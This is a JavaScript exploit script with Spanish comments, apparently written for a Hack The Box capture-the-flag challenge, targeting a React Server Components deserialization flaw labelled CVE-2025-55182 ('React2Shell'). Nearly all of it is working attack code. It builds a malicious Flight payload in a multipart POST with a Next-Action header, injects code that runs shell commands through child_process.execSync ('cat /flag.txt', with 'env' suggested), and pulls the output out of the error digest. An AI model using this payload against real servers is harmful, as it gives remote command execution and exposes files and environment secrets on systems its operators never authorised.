// React2Shell Exploit (CVE-2025-55182) - Exfiltration via Error Mode
// Objetivo: Leer /flag.txt lanzando su contenido como un error de React

const cmd = "cat /flag.txt"; // Asegúrate de la ruta (prueba también 'ls /' o 'env')

// Payload malicioso: Inyecta en _prefix y LANZA UN ERROR con el resultado
// Usamos process.mainModule.require para evitar restricciones de importación
const maliciousCode = `
  var r = process.mainModule.require;
  var out = r('child_process').execSync('${cmd}').toString();
  throw new Error('PWNED:' + out); 
`;

// Construimos el objeto Flight malicioso
// Estructura: 1: { ... "then": { "_prefix": ... } ... }
const flightPayload = `1:{"id":"1","bound":null,"chunks":[{"name":"default","args":[],"value":{"then":{"_prefix":"${maliciousCode.replace(
  /\n/g,
  ""
)}"},"status":"resolved_model","value":"test"}}]}`;

// Usamos multipart/form-data manual para mayor efectividad
const boundary =
  "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
let body = `--${boundary}\r\n`;
body += `Content-Disposition: form-data; name="1"\r\n\r\n`; // El nombre "1" coincide con el ID del chunk
body += `${flightPayload}\r\n`;
body += `--${boundary}--`;

console.log("🚀 Lanzando ataque React2Shell...");

fetch("/", {
  headers: {
    "content-type": `multipart/form-data; boundary=${boundary}`,
    "Next-Action": "campal", // ID arbitrario, esperamos que deserialice los argumentos antes de fallar
    "Next-Router-State-Tree":
      "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
  },
  body: body,
  method: "POST",
}).then(async (r) => {
  const text = await r.text();
  console.log("--- RESPUESTA COMPLETA ---");
  console.log(text); // Mostramos los primeros caracteres

  // Buscamos la flag en el "digest" del error
  // React suele devolver algo como: E:{"digest":"PWNED:HTB{...}"}
  if (text.includes("PWNED:")) {
    const flag = text.match(/PWNED:(.*?)["<&\n]/);
    if (flag) {
      console.warn(
        `%c¡FLAG ENCONTRADA!: ${flag[1]}`,
        "color: lime; font-size: 16px; font-weight: bold;"
      );
    } else {
      console.warn(
        "Parece que el código se ejecutó (veo 'PWNED'), busca manualmente en la respuesta de arriba."
      );
    }
  } else if (text.includes("Server action not found")) {
    console.error(
      "Fallo: 'Server action not found'. La deserialización no ocurrió o el error fue suprimido."
    );
  }
});
